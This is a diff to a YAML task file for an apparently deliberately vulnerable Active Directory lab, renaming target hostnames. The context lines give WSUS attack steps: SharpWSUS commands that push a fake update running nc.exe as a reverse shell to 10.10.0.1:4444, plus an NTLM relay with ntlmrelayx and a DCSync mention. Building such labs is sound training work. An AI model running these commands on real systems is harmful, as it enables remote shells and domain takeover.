@@ -1,7 +1,7 @@
 ---
 # ==============================================================================
 # vuln_exchange/tasks/wsus.yml — SRV-041..055
-# Target: file01.corp.local
+# Target: scarif.empire.local
 #
 # SRV-041  WSUS server HTTP endpoint (no HTTPS)
 # SRV-042  WSUS unauthenticated update metadata access
@@ -56,8 +56,8 @@
         Prereqs: Access to WSUS admin console (port 8530/8531)
         Attack:
           SharpWSUS.exe create /payload:"C:\Tools\nc.exe" /args:"-e cmd 10.10.0.1 4444" /title:"KB99999999"
-          SharpWSUS.exe approve /updateid:<ID> /computername:ws01.corp.local /groupname:DVAD-Targets
-          SharpWSUS.exe check /updateid:<ID> /computername:ws01.corp.local
+          SharpWSUS.exe approve /updateid:<ID> /computername:tatooine.empire.local /groupname:DVAD-Targets
+          SharpWSUS.exe check /updateid:<ID> /computername:tatooine.empire.local
 
         Stage the payload at: C:\WSUSContent\ (world-writable — SRV-044)
 
@@ -69,7 +69,7 @@
         If WSUS runs as a domain account, relay to LDAP can be used for DCSync.
 
         SPN to check:
-          setspn -Q HTTP/wsus.corp.local
-          setspn -Q WSMAN/wsus.corp.local
+          setspn -Q HTTP/wsus.empire.local
+          setspn -Q WSMAN/wsus.empire.local
 
-        If found: ntlmrelayx.py --target http://file01.corp.local:8530/selfupdate/
+        If found: ntlmrelayx.py --target http://scarif.empire.local:8530/selfupdate/
